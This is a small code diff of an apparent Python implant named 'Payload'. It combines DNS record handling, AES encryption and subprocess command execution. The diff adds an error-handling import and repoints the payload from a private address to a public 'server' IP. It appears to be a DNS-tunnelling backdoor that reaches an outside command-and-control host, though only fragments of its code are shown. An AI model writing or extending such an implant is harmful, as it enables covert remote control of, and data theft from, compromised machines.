@@ -7,7 +7,7 @@ from dnslib import DNSRecord, DNSHeader, RR
 import base64
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
-from subprocess import PIPE, run, check_output, Popen
+from subprocess import PIPE, CalledProcessError, run, check_output, Popen
 import time
 
 class Payload:
@@ -125,4 +125,4 @@ def decrypting(enc,key):
     return cipher.decrypt(enc)
 
 
-payload("192.168.7.168") ### Address of server
+payload("18.222.157.118") ### Address of server
